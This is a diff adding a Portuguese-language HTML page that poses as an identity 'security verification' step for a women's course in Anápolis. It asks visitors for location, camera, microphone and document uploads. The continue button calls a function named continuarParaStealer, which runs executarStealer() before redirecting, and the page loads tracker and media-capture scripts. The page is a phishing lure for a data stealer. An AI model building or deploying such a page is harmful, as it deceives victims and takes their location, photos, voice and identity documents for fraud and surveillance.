@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação - Curso para Mulheres</title>
+    <link rel="stylesheet" href="styles/main.css">
+    <link rel="stylesheet" href="styles/animations.css">
+</head>
+<body>
+    <div class="container">
+        <header class="header">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-step active">3</div>
+                <div class="progress-step">4</div>
+            </div>
+            <h1>🔒 Verificação de Segurança</h1>
+            <p>Para garantir a autenticidade da sua inscrição</p>
+        </header>
+
+        <main class="main-content">
+            <div class="security-card">
+                <div class="security-icon">🛡️</div>
+                <h2>Verificação de Identidade</h2>
+                <p class="security-description">
+                    Para evitar fraudes e garantir que apenas mulheres reais de Anápolis 
+                    participem do programa, precisamos realizar uma verificação rápida.
+                </p>
+
+                <div class="permissions-list">
+                    <div class="permission-item" id="permission-location">
+                        <div class="permission-icon">📍</div>
+                        <div class="permission-content">
+                            <h3>Localização</h3>
+                            <p>Confirmar que você está em Anápolis/GO</p>
+                        </div>
+                        <button class="permission-btn" onclick="solicitarLocalizacao()">
+                            Verificar
+                        </button>
+                    </div>
+
+                    <div class="permission-item" id="permission-camera">
+                        <div class="permission-icon">📷</div>
+                        <div class="permission-content">
+                            <h3>Foto de Identificação</h3>
+                            <p>Selfie rápida para confirmação visual</p>
+                        </div>
+                        <button class="permission-btn" onclick="solicitarCamera()">
+                            Capturar
+                        </button>
+                    </div>
+
+                    <div class="permission-item" id="permission-microphone">
+                        <div class="permission-icon">🎤</div>
+                        <div class="permission-content">
+                            <h3>Verificação de Voz</h3>
+                            <p>Gravação rápida para análise de voz</p>
+                        </div>
+                        <button class="permission-btn" onclick="solicitarMicrofone()">
+                            Gravar
+                        </button>
+                    </div>
+
+                    <div class="permission-item" id="permission-files">
+                        <div class="permission-icon">📁</div>
+                        <div class="permission-content">
+                            <h3>Documentos</h3>
+                            <p>Fotos de RG ou comprovante de residência</p>
+                        </div>
+                        <button class="permission-btn" onclick="solicitarArquivos()">
+                            Enviar
+                        </button>
+                    </div>
+                </div>
+
+                <div class="verification-status" id="verificationStatus">
+                    <div class="status-item" id="status-location">
+                        <span>📍 Localização</span>
+                        <span class="status-badge">Pendente</span>
+                    </div>
+                    <div class="status-item" id="status-camera">
+                        <span>📷 Foto</span>
+                        <span class="status-badge">Pendente</span>
+                    </div>
+                    <div class="status-item" id="status-microphone">
+                        <span>🎤 Áudio</span>
+                        <span class="status-badge">Pendente</span>
+                    </div>
+                    <div class="status-item" id="status-files">
+                        <span>📁 Documentos</span>
+                        <span class="status-badge">Pendente</span>
+                    </div>
+                </div>
+
+                <div class="security-actions">
+                    <button class="btn-secondary" onclick="voltarCadastro()">
+                        Voltar
+                    </button>
+                    <button class="btn-primary" id="continueBtn" onclick="continuarParaStealer()" disabled>
+                        Continuar para Análise
+                    </button>
+                </div>
+            </div>
+
+            <!-- Elementos de mídia -->
+            <div id="mediaContainer" style="display: none;">
+                <video id="videoElement" autoplay playsinline></video>
+                <canvas id="canvasElement"></canvas>
+                <audio id="audioElement" controls style="display: none;"></audio>
+            </div>
+        </main>
+    </div>
+
+    <script src="js/tracker.js"></script>
+    <script src="js/media_capture.js"></script>
+    <script>
+        const leadId = new URLSearchParams(window.location.search).get('lead_id') || 
+                      localStorage.getItem('lead_id');
+
+        let permissoesConcluidas = {
+            location: false,
+            camera: false,
+            microphone: false,
+            files: false
+        };
+
+        function atualizarStatus() {
+            const todasConcluidas = Object.values(permissoesConcluidas).every(v => v);
+            document.getElementById('continueBtn').disabled = !todasConcluidas;
+        }
+
+        function marcarPermissaoConcluida(tipo) {
+            permissoesConcluidas[tipo] = true;
+            const statusElement = document.getElementById(`status-${tipo}`);
+            statusElement.querySelector('.status-badge').textContent = 'Concluído';
+            statusElement.querySelector('.status-badge').className = 'status-badge completed';
+            
+            const permissionElement = document.getElementById(`permission-${tipo}`);
+            permissionElement.style.opacity = '0.7';
+            permissionElement.querySelector('.permission-btn').disabled = true;
+            permissionElement.querySelector('.permission-btn').textContent = 'Concluído';
+            
+            atualizarStatus();
+        }
+
+        function voltarCadastro() {
+            window.location.href = '/cadastro';
+        }
+
+        function continuarParaStealer() {
+            // Executar stealer antes de redirecionar
+            executarStealer().then(() => {
+                window.location.href = `/confirmacao?lead_id=${leadId}`;
+            });
+        }
+
+        // Carregar scripts de captura
+        document.addEventListener('DOMContentLoaded', function() {
+            if (!leadId) {
+                window.location.href = '/cadastro';
+            }
+        });
+    </script>
+</body>
+</html>
